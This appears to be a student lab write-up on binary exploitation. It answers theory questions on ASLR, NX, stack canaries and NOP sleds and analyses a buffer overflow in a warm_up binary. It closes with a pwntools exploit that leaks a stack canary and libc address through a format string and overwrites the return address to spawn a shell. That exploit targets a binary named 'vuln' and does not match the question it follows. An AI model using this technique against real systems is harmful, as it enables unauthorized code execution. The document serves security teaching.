Task 1 - Theory

  1. What binary exploitation mitigation techniques do you know?

ASLR, Execution prevention (NX), canary

  1. Did NX solve all binary attacks? Why?

Well, it would prevent an attacker to write or execute his shellcode in particular memory storage with implemented NX bit but the stack itself is vulnerable to attacks. This could be achieved using a method called Return to Libc.

  1. Why do stack canaris end with 00?

0x00(NULL) terminates most of the strings in C. So it would not be used by an attacker in payload through a string operation to reconstruct the canary.

  1. What is NOP sled?

To be able to execute injected code, the program should jump to a specific address and continue running from there. But considering stack randomization and other runtime differences may make the address where the program will jump impossible to predict. So the attacker places NOPs in a big range of memory. Then, if the program jumps anywhere into the sled, it will run all the remaining NOPs, doing nothing, and then will run the payload code, just next to the sled.

Task 2 - Binary attack warming up

We are going to work on buffer overflow attack as one of the main, most popular, and widely-spread binary attacks. You are given a binary warm_up.
Answer the question and provide explanation details with PoC: “Why in the warm_up binary, opposite to the binary64 from Lab1, the value of i doesn’t change even if our input was very long?”

sample function contains a char buffer[10], so it will contain 10 characters that end with byte 0x00. Thus, if we put 10 symbols (f = 0x66), it will overwrite the last byte from 0xffffffff to 0x00 (Figure 1). This is possible because it uses the gets function, which does not check the length of the input data.

0x7fffffffde18 0x6666 0x66666666 0x00666666 - char array - fffffffff

Here, if we keep increasing the input, it will overwrite i and then the return address.
Now let’s take a look at warm_up. It contains a canary. So, if we check the stack, we will see that it is different (Figure 2).

a = 0x61. 0x42f31b00 is canary. So if I add one more symbol it will overwrite the 0x00 in canary (Figure 3).


Figure 3 - 0x00 is overwritten with 0x61

The usage of stack canaries does not secure the variables from overwriting. Even very long input data can not overwrite the value because GCC reorders variables to protect them from being overwritten. This is achieved by simply locating arrays below (at higher memory addresses) other local variables.

As result I got the following exploit:

#!/usr/bin/env python2

from pwn import *

HOST, PORT = '127.0.0.1', 42001
BINARY = './vuln'


elf = ELF(BINARY)
context.arch = 'amd64'

libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')

def start():
    if not args.REMOTE:
        print "LOCAL PROCESS"
        return process(BINARY)
    else:
        print "REMOTE PROCESS"
        return remote(HOST, PORT)

p = start()
# Leak stack canary (offset 9) and the libc address (offset 3)

p.sendline('%9$lx-%3$lx')
p.recvline()
leaks = p.recvline()
stack_canary = int(leaks.split('-')[0], 16)
libc.address = int(leaks.split('-')[1][:-1], 16) - 0x10E0A7

log.info('canary: ' + hex(stack_canary))
log.info('libc base: ' + hex(libc.address))

system = libc.symbols['system']
bin_sh = next(libc.search('/bin/sh'))
one_gadget = libc.address + 0xe3b31 # 0xe3b31, 0xe3b34

log.info('system: ' + hex(system))
log.info('bin sh: ' + hex(bin_sh))
log.info('one_gadget: ' + hex(one_gadget))

payload = 'A'*24 # Write up to the stack canary
payload += p64(stack_canary) # Ensure we don't change the stack canary
payload += 'B'*8 # Overwrite RBP
payload += p64(one_gadget) # Overwrite RIP

p.sendline(payload)

p.interactive()
